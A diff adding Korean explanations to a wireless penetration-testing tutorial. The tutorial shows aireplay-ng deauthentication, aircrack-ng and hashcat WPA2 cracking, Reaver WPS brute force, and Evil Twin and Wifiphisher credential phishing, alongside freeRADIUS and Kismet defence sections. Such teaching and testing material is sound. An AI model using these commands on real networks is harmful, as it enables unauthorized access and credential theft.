@@ -25,6 +25,9 @@
 ## 2. 무선 공격 환경 설정
 
 ### 무선 랜카드 모니터 모드 설정
+
+무선 어댑터를 모니터 모드로 전환하면 자신과 연결되지 않은 프레임도 캡처할 수 있습니다. `airmon-ng check kill`로 간섭 프로세스를 종료한 후 `airmon-ng start wlan0`으로 모니터 모드를 활성화합니다.
+
 ```bash
 # 무선 인터페이스 확인
 iwconfig
@@ -51,6 +54,9 @@ airmon-ng stop wlan0mon
 ```
 
 ### 무선 네트워크 스캔
+
+`airodump-ng`로 주변 AP와 클라이언트 목록을 스캔합니다. BSSID, 채널, ESSID, 암호화 방식 등의 정보를 수집하고, `-w` 옵션으로 패킷을 파일에 저장하여 이후 분석에 활용합니다.
+
 ```bash
 # AP 목록 스캔
 airodump-ng wlan0mon
@@ -71,6 +77,9 @@ airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
 ## 3. WPA2 PSK 크랙
 
 ### 4-way Handshake 캡처
+
+WPA2 크래킹을 위해 클라이언트가 AP에 재연결할 때 발생하는 4-Way Handshake를 캡처합니다. `aireplay-ng --deauth`로 연결을 끊으면 자동 재연결 시 핸드셰이크가 발생합니다.
+
 ```bash
 # Step 1: AP 스캔으로 목표 정보 확인
 airodump-ng wlan0mon
@@ -92,6 +101,9 @@ aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 ```
 
 ### WPA2 핸드셰이크 크랙
+
+캡처한 WPA2 4-way 핸드셰이크 파일을 aircrack-ng 또는 hashcat으로 오프라인 크래킹합니다. 사전 파일의 품질이 크래킹 성공 여부를 결정합니다.
+
 ```bash
 # aircrack-ng (CPU 기반)
 aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
@@ -121,6 +133,9 @@ hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rul
 ## 4. WPS 공격
 
 ### Reaver (WPS PIN 브루트포스)
+
+Reaver로 WPS(Wi-Fi Protected Setup) PIN 브루트포스 공격을 수행합니다. WPS가 활성화된 AP를 대상으로 8자리 PIN을 무차별 대입합니다.
+
 ```bash
 # WPS 활성화 AP 탐지
 wash -i wlan0mon
@@ -147,6 +162,9 @@ bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
 ## 5. Evil Twin 공격 (가짜 AP)
 
 ### 기본 Evil Twin 설정
+
+Evil Twin 공격은 정상 AP와 동일한 SSID로 가짜 AP를 만들어 클라이언트를 속이는 기법입니다. `hostapd`로 가짜 AP를 구성하고 `dnsmasq`로 DHCP를 제공하며, 연결된 피해자의 트래픽을 가로채거나 인증 페이지로 유도합니다.
+
 ```bash
 # 1단계: 가짜 AP 생성 (hostapd)
 cat > /tmp/hostapd.conf << EOF
@@ -185,6 +203,9 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 ### Wifiphisher (자동화 Evil Twin)
+
+Wifiphisher는 Evil Twin 공격을 자동화하는 도구입니다. 피해자를 가짜 AP에 연결시키고 피싱 페이지로 자격증명을 탈취합니다.
+
 ```bash
 apt-get install wifiphisher
 
@@ -205,6 +226,9 @@ wifiphisher --essid "TargetWiFi" --channel 6
 ## 6. 무선 트래픽 분석
 
 ### 암호화된 WPA2 트래픽 복호화
+
+캡처된 WPA2 암호화 트래픽을 PSK(Pre-Shared Key)를 이용해 복호화합니다. Wireshark에서 키를 등록하면 패킷 내용을 평문으로 확인할 수 있습니다.
+
 ```bash
 # Wireshark에서 WPA2 복호화
 # Edit → Preferences → Protocols → IEEE 802.11
@@ -226,6 +250,9 @@ tshark -r decrypted.pcap -Y http -T fields -e http.request.uri
 ## 7. 무선 보안 강화
 
 ### WPA2/WPA3 Enterprise 설정 (freeRADIUS)
+
+WPA2/WPA3 Enterprise 환경을 구축하기 위해 freeRADIUS 인증 서버를 설치합니다. 기업 환경에서는 개인 PSK 대신 RADIUS 기반 인증을 사용합니다.
+
 ```bash
 apt-get install freeradius
 
@@ -238,6 +265,9 @@ apt-get install freeradius
 ```
 
 ### 무선 침입 탐지 (Wids)
+
+Kismet을 무선 침입 탐지 시스템(WIDS)으로 사용합니다. 비인가 AP, 비콘 플러딩, 디어셉티케이션 공격 등을 탐지합니다.
+
 ```bash
 # Kismet (무선 IDS/IPS)
 apt-get install kismet
@@ -258,6 +288,9 @@ airbase-ng -e "HoneyPot_AP" -c 6 wlan0mon
 ## 8. 무선 네트워크 정찰 심화
 
 ### 수동 정찰 (탐지 위험 없음)
+
+탐지 위험을 최소화하면서 무선 환경을 정찰하는 방법입니다. 채널을 순환하며 주변 AP와 클라이언트 정보를 수집합니다.
+
 ```bash
 # 채널 호핑하며 모든 AP 스캔
 airodump-ng wlan0mon --band abg    # 2.4GHz + 5GHz 동시 스캔
@@ -274,6 +307,9 @@ airodump-ng --band a wlan0mon
 ```
 
 ### 클라이언트 정보 수집
+
+무선 클라이언트가 보내는 Probe Request 패킷을 수집합니다. 클라이언트가 이전에 연결했던 AP 목록(PNL)을 파악할 수 있습니다.
+
 ```bash
 # Probe Request 수집 (클라이언트가 연결 시도한 AP 목록)
 airodump-ng wlan0mon | grep "STATION"
@@ -292,6 +328,9 @@ airodump-ng wlan0mon --bssid [클라이언트MAC]
 ## 9. PMKID 공격 (핸드셰이크 없이 크랙)
 
 ### hcxdumptool을 이용한 PMKID 캡처
+
+PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.
+
 ```bash
 # 설치
 apt-get install hcxdumptool hcxtools
@@ -521,6 +560,9 @@ Wireshark에서 무선 신호 정보:
 ```
 
 ### 무선 트래픽 분석 자동화
+
+airodump-ng 결과를 CSV 파일로 저장한 후 스크립트로 자동 분석합니다. 대량의 AP 정보를 체계적으로 처리할 때 유용합니다.
+
 ```bash
 # airodump-ng 결과를 CSV로 저장 후 분석
 airodump-ng wlan0mon -w scan --output-format csv
@@ -728,6 +770,9 @@ if __name__ == "__main__":
 ## 14. 무선 네트워크 포렌식
 
 ### 캡처 파일에서 WPA2 복호화
+
+캡처된 패킷 파일에서 WPA2 키를 이용해 암호화 트래픽을 복호화합니다. 사전에 PSK를 알고 있을 때 오프라인으로 분석할 수 있습니다.
+
 ```bash
 # 방법 1: Wireshark GUI
 Edit → Preferences → Protocols → IEEE 802.11
@@ -770,6 +815,9 @@ PMKID:
 ```
 
 ### 채널 분석 및 간섭 탐지
+
+주파수 채널별 AP 분포를 분석하여 채널 간섭과 혼잡도를 파악합니다. 최적 채널 선택과 간섭 원인 탐지에 활용됩니다.
+
 ```bash
 # 채널별 AP 분포 확인
 airodump-ng wlan0mon --band abg 2>/dev/null | grep -v "BSSID" | \
